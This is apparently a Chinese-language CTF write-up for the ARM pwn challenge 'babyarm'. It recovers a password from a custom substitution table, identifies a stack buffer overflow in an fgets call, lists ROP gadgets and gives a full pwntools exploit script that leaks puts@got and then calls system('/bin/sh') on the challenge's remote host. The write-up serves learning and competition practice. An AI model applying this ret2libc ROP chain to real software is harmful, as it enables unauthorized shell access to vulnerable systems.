
#wp #pwn

【[[PWN]]】【PWN】babyarm - [[扩展题目]]

创建时间：2025-07-16 23:21

### 解题过程
### 一、题目描述

- **题目名**：babyarm
    
- **远程靶机**：`110.42.47.169:35968`
    
- **文件**：`chall`（32‑bit ARM ELF，可直接下载）
    
- **交互逻辑**：
    
    1. 运行后打印
        
        ```
        ===== Simple Decoder =====
        ===== v1.0.0 =====
        msg>
        ```
        
        要求输入解密口令；
        
    2. 口令通过后打印
        
        ```
        comment>
        ```
        
        接收用户输入并返回；
        
    3. 循环第 1 步。
        

---

### 二、环境 & 二进制保护

```
file chall
# ELF 32-bit LSB executable, ARM, little endian

readelf -h chall | grep "Entry point"
# Entry point address:               0x1050c

checksec chall
# NX: enabled
# PIE:   no PIE
# RELRO: Partial RELRO
# Canary: no
```

- **NX**：栈不可执行，需 ROP
    
- **Canary**：无，可覆盖返回地址
    
- **PIE**：关闭，.text 段固定在 0x10000 起
    

---

### 三、解密口令 `s1mpl3Dec0d4r` 的获取

1. **观察界面**  
    程序开头显示标题
    
    ```
    ===== Simple Decoder =====
    ===== v1.0.0 =====
    ```
    
    很可能口令就是标题经某种“简单解码”后的结果。
    
2. **静态分析** `**decode**` **函数**  
    ![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250716232548686.png)
    
3. **编写脚本验证**  
    仿照二进制的逻辑，用 Python 重现该“换表”规则，将字符串 `"SimpleDecoder"` 映射为：
    
    ```
    mapping = { ... }   # 从 table_in/table_out 生成的映射
    src = "SimpleDecoder"
    pwd = "".join(mapping[c] for c in src)
    print(pwd)   # => s1mpl3Dec0d4r
    ```
    
4. **得出口令**  
    通过上述换表映射，得到：
    
    ```
    S → s
    i → 1
    m → m
    p → p
    l → l
    e → 3
    D → D
    e → 3
    c → c
    o → 0
    d → d
    e → 4    # （自定义映射中 e 在这一轮对应 4）
    r → r
    ```
    
    最终：
    
    ```
    s1mpl3Dec0d4r
    ```
    

> **小结**：口令并非简单的 Leet（1337）翻译，而是二进制里定义的自定义换表映射结果。

---

### 四、漏洞点 & 利用思路

1. **漏洞函数**
    
    ```
    char buf[0x2c];
    printf("comment> ");
    fgets(buf, 0x100, stdin);   // 超出 buf 大小，无长度检查
    process(buf);
    ```
    
    - **缓冲区溢出**：`buf` 只有 44 字节，却读入更多数据
        
    - **无 Canary**，可覆盖返回地址
        
    - **NX** 启用，需 ROP
        
2. **ROP 利用总体思路**
    
    - **第一阶段**：`puts(puts@got)` 泄露 libc 中 `puts` 的真实地址
        
    - **第二阶段**：`system("/bin/sh")`，拿到交互 shell
        
3. **ARM 调用约定**
    
    - 第 1 个参数放在 `r0`，第 2 个参数放在 `r1`
        
    - 使用 `mov r0, r7; blx r3` 可把我们写入 `r7` 的值作为第 1 个参数，再跳到 `r3` 执行
        

---

### 五、关键 Gadget & 地址

|名称|偏移|功能|
|---|---|---|
|`pop {r4,r5,r6,r7,r8,sb,sl,pc}`|`0x10CB0`|一次性修改 r4–r7 等并跳转 pc|
|`pop {r3,pc}`|`0x10464`|修改 r3 并跳转 pc（设置函数地址）|
|`mov r0, r7; blx r3`|`0x10CA0`|调用 `r3(r0)`|
|程序入口（Entry，即 `main`）|`0x1050C`|泄露后返回，再次认证|

`elf.entry` 即为 `0x1050C`，程序加载基址固定。

---

### 六、完整 Exploit 脚本（`exp.py`）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# —— 配置区 —— 
BINARY    = './chall'
LIBC      = './libc-2.27.so'
HOST,PORT = '110.42.47.169', 35968

context.arch      = 'arm'
context.os        = 'linux'
context.endian    = 'little'
context.log_level = 'info'  # debug 时用 'debug'

# 本地调试： python3 exp.py LOCAL=1
def start():
    if args.LOCAL:
        return process(['./start.sh'])
    return remote(HOST, PORT)

io   = start()
elf  = ELF(BINARY)
libc = ELF(LIBC)

# —— ROP Gadget —— 
pop_all          = 0x10CB0       # pop {r4,r5,r6,r7,r8,sb,sl,pc}
pop_r3_pc        = 0x10464       # pop {r3,pc}
mov_r0_r7_blx_r3 = 0x10CA0       # mov r0,r7; blx r3
entry_addr       = elf.entry     # 0x1050C

# 解密口令（来自二进制自定义换表）
PASSWORD = b's1mpl3Dec0d4r'

# —— 阶段1：泄露 puts 地址 —— 
def leak_puts():
    # 1. 绕过 msg> 口令验证
    io.sendlineafter(b'msg> ', PASSWORD)
    # 2. 构造 ROP 泄露 puts@got
    io.sendlineafter(b'comment> ',
        b'A'*0x2c +
        p32(pop_all) +
          p32(0)*3 +               # r4, r5, r6
          p32(elf.got['puts']) +   # r7 = &puts@got
          p32(0)*3 +               # r8, sb, sl
        p32(pop_r3_pc) +
          p32(elf.plt['puts']) +   # r3 = puts@plt
        p32(mov_r0_r7_blx_r3) +    # blx r3(r0=r7)
        p32(entry_addr)*4         # 返回入口，重走一次
    )
    # 3. 接收泄露
    data = io.recv(4)
    puts_leak = u32(data)
    base = puts_leak - libc.sym['puts']
    log.success(f'leaked puts = {hex(puts_leak)}, libc base = {hex(base)}')
    return base

# —— 阶段2：getshell —— 
def get_shell(libc_base):
    system_addr = libc_base + libc.sym['system']
    binsh       = libc_base + next(libc.search(b'/bin/sh\x00'))

    # 重复认证
    io.sendline(PASSWORD)
    # 构造 ROP 调用 system("/bin/sh")
    io.sendlineafter(b'comment> ',
        b'A'*0x2c +
        p32(pop_all) +
          p32(0)*3 +
          p32(binsh) +            # r7 = "/bin/sh"
          p32(0)*3 +
        p32(pop_r3_pc) +
          p32(system_addr) +      # r3 = system@plt
        p32(mov_r0_r7_blx_r3)     # 调用 system(r0=r7)
    )

if __name__ == '__main__':
    base = leak_puts()
    get_shell(base)
    io.interactive()
```

> **注释要点**：
> 
> - `sendlineafter('msg> ', PASSWORD)` —— 先输入反汇编还原的自定义口令
>     
> - 第一阶段 ROP → 泄露 `puts@got` → 计算 `libc base`
>     
> - 第二阶段 ROP → 将 `"/bin/sh"` 放入 r7 → 将 `system@plt` 放入 r3 → `mov r0,r7; blx r3` 执行 `system("/bin/sh")`
>     

---

### 七、知识点回顾

1. **自定义换表口令**：通过静态逆向 `decode` 函数，提取 `table_in`/`table_out`，对标题文本“SimpleDecoder”进行映射，得到 `s1mpl3Dec0d4r`。
    
2. **缓冲区溢出 + ROP**：覆盖返回地址，利用已有代码片段实现函数调用。
    
3. **GOT/PLT 泄露**：先调用 `puts(puts@got)` 获取真实地址，再借助本地 libc 符号表定位。
    
4. **ARM 调用约定**：第 1 参数在 r0，需要先 `mov r0,r7`；函数地址在 r3，用 `blx r3` 跳转。
    
5. **二次重返入口**：PIE 关闭，可直接返回固定入口地址，实现两阶段交互。
    

---